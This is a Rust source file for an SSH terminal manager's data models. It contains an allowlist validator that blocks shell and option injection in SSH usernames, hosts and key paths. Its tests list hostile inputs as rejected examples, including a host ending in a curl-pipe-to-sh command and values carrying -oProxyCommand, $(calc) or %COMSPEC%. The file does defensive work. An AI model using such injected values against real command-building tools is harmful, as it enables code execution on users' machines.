use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Connection {
    pub id: String,
    pub name: String,
    pub host: String,
    pub port: u16,
    pub username: String,
    #[serde(default)]
    pub description: String,
    #[serde(default)]
    pub icon: String,
    #[serde(default)]
    pub color: String,
    #[serde(default)]
    pub tags: Vec<String>,
    #[serde(default)]
    pub folder: String,
    pub auth_method: AuthMethod,
    /// Path to a private key, passed to `ssh -i`.
    #[serde(default)]
    pub key_path: Option<String>,
    #[serde(default)]
    pub created_at: String,
    #[serde(default)]
    pub updated_at: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AuthMethod {
    Password,
    Key,
}

impl AuthMethod {
    pub fn as_str(&self) -> &'static str {
        match self {
            AuthMethod::Password => "password",
            AuthMethod::Key => "key",
        }
    }
    pub fn from_str(s: &str) -> Self {
        match s {
            "key" => AuthMethod::Key,
            _ => AuthMethod::Password,
        }
    }
}

impl Connection {
    /// The key path only matters when it is going to be typed; a password
    /// connection keeps whatever path it had but never uses it.
    pub fn check_ssh_target(&self) -> Result<(), String> {
        let key_path = match self.auth_method {
            AuthMethod::Key => self.key_path.as_deref(),
            AuthMethod::Password => None,
        };
        check_ssh_target(&self.username, &self.host, key_path)
    }
}

/// Refuse a username, host or key path that would change the meaning of the
/// `ssh …` line `build_ssh_command` types into the user's shell. These fields
/// come from the connection dialog, but also from workspace and settings
/// imports — files someone else may have written — so a host of
/// `example.com; curl … | sh` is an attack, not a typo.
///
/// An allowlist rather than quoting, because no one quoting is read the same
/// way by every shell the line can land in: cmd.exe (the Windows default) has no
/// single quotes and expands `%VAR%` inside double ones, PowerShell expands `$`
/// and backticks inside double quotes, and POSIX shells want single quotes. The
/// line also passes through `${VAR}` substitution *after* it is built, so a `$`
/// that survived quoting could still splice a variable's value, quotes and all,
/// into it. Keeping every shell-special character out of these fields makes the
/// line safe in all of them at once.
///
/// A leading `-` is refused on its own terms: no quoting stops ssh from reading
/// `-oProxyCommand=…` in the destination slot as an option, and the destination
/// starts with the username.
///
/// Values are checked exactly as stored, not trimmed: a newline at the end of a
/// username would press Enter halfway through the typed line. Callers that
/// accept user input trim first (see `storage::connections_save`).
pub fn check_ssh_target(username: &str, host: &str, key_path: Option<&str>) -> Result<(), String> {
    if username.is_empty() {
        return Err("The username is required.".into());
    }
    if host.is_empty() {
        return Err("The host is required.".into());
    }
    check_field(
        "username",
        username,
        is_username_char,
        "letters, digits, dots, hyphens, underscores, @ and \\",
    )?;
    // PowerShell reads a word that starts with @ as splatting.
    if username.starts_with('@') {
        return Err("The username cannot start with @.".into());
    }
    check_field(
        "host",
        host,
        is_host_char,
        "letters, digits, dots, hyphens, underscores and colons",
    )?;
    if let Some(path) = key_path.filter(|p| !p.is_empty()) {
        check_field(
            "key path",
            path,
            is_key_path_char,
            "letters, digits, spaces, slashes, backslashes, colons, dots, underscores, hyphens, ~ and +",
        )
        .map_err(|e| {
            format!("{e} Move the key, or set IdentityFile for this host in ~/.ssh/config.")
        })?;
    }
    Ok(())
}

fn check_field(
    label: &str,
    value: &str,
    allowed: fn(char) -> bool,
    allowed_desc: &str,
) -> Result<(), String> {
    if value.starts_with('-') {
        return Err(format!("The {label} cannot start with a hyphen."));
    }
    if let Some(c) = value.chars().find(|&c| !allowed(c)) {
        return Err(format!(
            "The {label} cannot contain {}. It can hold only {allowed_desc}.",
            describe_char(c)
        ));
    }
    Ok(())
}

/// Name the offending character without echoing it raw: the message is printed
/// into the terminal, where an escape character would be interpreted.
fn describe_char(c: char) -> String {
    match c {
        ' ' => "spaces".into(),
        c if c.is_whitespace() || c.is_control() => "line breaks or control characters".into(),
        c => format!("\"{c}\""),
    }
}

// `is_alphanumeric` admits non-ASCII letters, none of which any of the shells
// treat specially.

fn is_host_char(c: char) -> bool {
    // Colons for IPv6. No `%`: cmd.exe expands it, so link-local addresses
    // with a zone id need an alias in ~/.ssh/config.
    c.is_alphanumeric() || matches!(c, '.' | '-' | '_' | ':')
}

fn is_username_char(c: char) -> bool {
    // `@` for `user@corp.example@host` (ssh splits at the last one) and `\`
    // for `DOMAIN\user`, both common against Windows servers. The backslash is
    // the one character here a POSIX shell cares about, so `build_ssh_command`
    // quotes the destination there.
    c.is_alphanumeric() || matches!(c, '.' | '-' | '_' | '@' | '\\')
}

fn is_key_path_char(c: char) -> bool {
    // Spaces are allowed because `quote_key_path` quotes them; nothing else
    // that needs quoting is.
    c.is_alphanumeric() || matches!(c, ' ' | '/' | '\\' | ':' | '.' | '_' | '-' | '~' | '+')
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Workspace {
    pub id: String,
    pub name: String,
    #[serde(default)]
    pub description: String,
    #[serde(default)]
    pub icon: String,
    #[serde(default)]
    pub tags: Vec<String>,
    /// FlexLayout model JSON, stored verbatim.
    #[serde(default)]
    pub layout: serde_json::Value,
    #[serde(default)]
    pub created_at: String,
    #[serde(default)]
    pub updated_at: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TerminalDef {
    pub id: String,
    pub workspace_id: String,
    pub connection_id: Option<String>,
    #[serde(default)]
    pub title: String,
    #[serde(default)]
    pub startup_tasks: Vec<StartupTask>,
    #[serde(default)]
    pub sort_order: i64,
    /// Per-terminal shell override; empty falls back to the global setting.
    #[serde(default)]
    pub shell: String,
}

/// A reusable recipe for a terminal: which connection to use, the shell, the
/// startup tasks, plus its own variables (scope `preset`). Opening one copies
/// everything into a fresh terminal — the two are independent from then on, so
/// editing a preset never disturbs terminals already on screen.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Preset {
    pub id: String,
    pub name: String,
    #[serde(default)]
    pub description: String,
    #[serde(default)]
    pub connection_id: Option<String>,
    #[serde(default)]
    pub startup_tasks: Vec<StartupTask>,
    /// Shell override; empty falls back to the global setting.
    #[serde(default)]
    pub shell: String,
    #[serde(default)]
    pub color: String,
    #[serde(default)]
    pub tags: Vec<String>,
    #[serde(default)]
    pub sort_order: i64,
    #[serde(default)]
    pub created_at: String,
    #[serde(default)]
    pub updated_at: String,
}

/// Startup task engine steps. Extensible: add variants for
/// confirmation, conditional, open_terminal, notification, ai in Phase 2.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum StartupTask {
    WaitForPrompt,
    Command { value: String },
    Wait { milliseconds: u64 },
}

/// Commands sent to a live terminal session's driver task. Shared by both
/// session backends (`ssh`, `pty`) so the startup engine can drive either.
pub enum SessionCmd {
    Data(Vec<u8>),
    Resize(u32, u32),
    Close,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Variable {
    pub id: String,
    pub scope: String, // global | workspace | terminal
    pub owner_id: Option<String>,
    pub key: String,
    pub value: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ok(user: &str, host: &str, key: Option<&str>) -> bool {
        check_ssh_target(user, host, key).is_ok()
    }

    #[test]
    fn accepts_ordinary_targets() {
        assert!(ok("root", "example.com", None));
        assert!(ok("deploy-bot", "10.0.0.12", None));
        assert!(ok("first.last", "db_primary.internal", None));
        assert!(ok("root", "::1", None));
        assert!(ok("root", "2001:db8::7", None));
        assert!(ok("CORP\\alice", "win-host", None));
        assert!(ok("alice@corp.example", "win-host", None));
        assert!(ok("δοκιμή", "παράδειγμα.gr", None));
    }

    #[test]
    fn accepts_ordinary_key_paths() {
        for path in [
            "/home/u/.ssh/id_ed25519",
            "~/.ssh/id_rsa",
            r"C:\Users\u\.ssh\id_rsa",
            "/home/u/my keys/id_ed25519",
            r"C:\my keys\id_rsa",
            "/keys/client+prod.pem",
        ] {
            assert!(ok("root", "example.com", Some(path)), "{path}");
        }
    }

    #[test]
    fn treats_empty_key_path_as_absent() {
        assert!(ok("root", "example.com", Some("")));
    }

    /// Each of these would run something on the user's own machine, in at
    /// least one of the shells the line can be typed into.
    #[test]
    fn rejects_shell_injection_in_host() {
        for host in [
            "example.com; curl -s https://x.example/a | sh",
            "example.com && calc",
            "example.com | calc",
            "$(calc)",
            "`calc`",
            "${HOME}",
            "%COMSPEC%",
            "example.com\ncalc",
            "example.com\rcalc",
            "example.com calc",
            "a'b",
            "a\"b",
            "fe80::1%eth0",
            "[::1]",
        ] {
            assert!(!ok("root", host, None), "{host:?}");
        }
    }

    #[test]
    fn rejects_shell_injection_in_username() {
        for user in ["root;calc", "root calc", "$(calc)", "root\n", "a&b", "a|b", "a'b"] {
            assert!(!ok(user, "example.com", None), "{user:?}");
        }
    }

    /// cmd.exe runs `@x` as `x` with echo off, so a username that ended in a
    /// newline would turn the host into a command.
    #[test]
    fn checks_values_untrimmed() {
        assert!(!ok("root\n", "calc", None));
        assert!(!ok(" root", "example.com", None));
        assert!(!ok("root", "example.com ", None));
    }

    #[test]
    fn rejects_option_injection() {
        assert!(!ok("-oProxyCommand=calc", "example.com", None));
        assert!(!ok("root", "-oProxyCommand=calc", None));
        assert!(!ok("root", "example.com", Some("-oProxyCommand=calc")));
    }

    #[test]
    fn rejects_leading_at_in_username() {
        assert!(!ok("@args", "example.com", None));
    }

    #[test]
    fn rejects_shell_injection_in_key_path() {
        for path in [
            r"C:\k\id;calc",
            r"C:\k\id&calc",
            "/k/$(calc)",
            "/k/${HOME}",
            r"C:\k\%COMSPEC%",
            "/k/`calc`",
            "/k/id\"x",
            "/k/id'x",
            "/k/id\ncalc",
            "/k/(old)/id",
        ] {
            assert!(!ok("root", "example.com", Some(path)), "{path:?}");
        }
    }

    #[test]
    fn requires_username_and_host() {
        assert!(!ok("", "example.com", None));
        assert!(!ok("root", "", None));
    }

    #[test]
    fn ignores_key_path_for_password_auth() {
        let mut c = Connection {
            id: String::new(),
            name: "t".into(),
            host: "example.com".into(),
            port: 22,
            username: "root".into(),
            description: String::new(),
            icon: String::new(),
            color: String::new(),
            tags: vec![],
            folder: String::new(),
            auth_method: AuthMethod::Password,
            key_path: Some("/k/id;calc".into()),
            created_at: String::new(),
            updated_at: String::new(),
        };
        assert!(c.check_ssh_target().is_ok());
        c.auth_method = AuthMethod::Key;
        assert!(c.check_ssh_target().is_err());
    }

    /// The message is written into the terminal, so it must not carry the raw
    /// character back with it.
    #[test]
    fn never_echoes_control_characters() {
        let err = check_ssh_target("root", "a\x1b[31mb", None).unwrap_err();
        assert!(!err.contains('\x1b'), "{err:?}");
    }
}
